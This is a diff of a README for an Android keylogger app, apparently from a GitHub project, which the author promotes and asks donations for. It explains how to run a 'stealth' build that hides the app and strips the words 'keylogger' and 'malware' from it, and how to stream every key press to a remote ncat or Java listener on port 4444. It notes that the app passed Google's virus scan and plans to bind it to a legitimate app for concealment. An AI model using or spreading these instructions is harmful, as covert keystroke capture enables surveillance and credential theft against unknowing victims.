@@ -14,6 +14,8 @@ To-Do
 - [ ] hide/bind keylogger with another working app for hiding in plain sight
 ![Screenshot_20230121_091918](https://user-images.githubusercontent.com/28081004/213873094-bc139731-67c2-4190-af5d-c57d3b4bdf6f.png)
 
+no need to build ip or port into apk before install
+
 project was originally built in a AIDE (mobile app dev) using an old 2.2 Gradle build on max API 21 (things are just thrown everywhere right now, I'll clean it up if there's any company, enjoy :)
 
 this version was built in android studio electric eel 2022.1.1 with Gradle updated to 7.6 and API all the way up to 33 (android 13) you can use any listener
@@ -35,13 +37,16 @@ without the quotes and replace IP and port with your own IP:PORT
 
 this option has removed all words "keylogger" and "malware" from UI and code as well as folders and hides the app 100% except settings installed list in
 android BELLOW Oreo, API 29 and up it will just open app info not showing the IP port field
+
 ![Screenshot_20230121_092852](https://user-images.githubusercontent.com/28081004/213873696-b7104b3c-7a17-46a5-a80d-11af8cfee183.png)
 ![Screenshot_20230121_092759](https://user-images.githubusercontent.com/28081004/213873716-8d0265db-4b4a-443f-8749-7549fa4f2f48.png)
 
 # Virus Total
 normal APK hash b8c49cb5d9e931a2f25898c74a729fe642d725ab9b7878b39a7b46f9fa9e02f5 (you can search by hash, 3 hits)
-# stealth APK hash aab9a81cb74ee778cfdbbc1ff06d9fb4df04a03752cceb50afc3aee39e7aa5f5 
-# PASSED GOOGLE VIRUS SCAN, 2 hits
+
+stealth APK hash aab9a81cb74ee778cfdbbc1ff06d9fb4df04a03752cceb50afc3aee39e7aa5f5 
+
+- [X] PASSED GOOGLE VIRUS SCAN, 2 hits
 
 # NORMAL INSTALL
 
@@ -55,6 +60,7 @@ no manual fix.dat required
 
 # VIEWING LOGS
 ![Screenshot_20230121_092543](https://user-images.githubusercontent.com/28081004/213873151-b06c1b07-71cb-4c1d-89b9-d8416eeec27b.png)
+
 see and record each key press in real time
 open net cat and do
 
@@ -63,6 +69,8 @@ for windows, use net cat 5.59 beta
 .\ncat.exe -klvp 4444
 
 just tells net cat to listen on port 4444 and not close
+
+for java just download the listener in release and type javac MessageListener.java then java MessageListener
 
 enjoy!
 
@@ -94,8 +102,13 @@ check app folders in android for a key folder or a fix.dat file
 
 
 
-# Donate (I'm very excited to announce this is my first app coded and built in AS and first GitHub project, seeing this her alone was worth it, enjoy)
-If you've found my work to be valuable, I would greatly appreciate your support, please consider making a donation. Every little bit helps and allows me to keep creating and improving. Thank you for your consideration and support!
+# Donate
+
+I'm very excited to announce this is my first app coded and built in AS and first GitHub project, seeing this here alone was worth it, I seen i got
+5 downloads and went to tidy this up a little bit I got so excited. Please leave a star if you like this project, would love to move up in the
+android-keylogger tag :) enjoy
+
+If you've found my work to be valuable, I would greatly appreciate your support, Leave a star. Every little bit helps and allows me to keep creating and improving. Thank you for your consideration and support!
 
 <a href="https://www.buymeacoffee.com/KreaByte"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee <3&emoji=&slug=KreaByte&button_colour=BD5FFF&font_colour=ffffff&font_family=Comic&outline_colour=000000&coffee_colour=FFDD00" /></a>
 
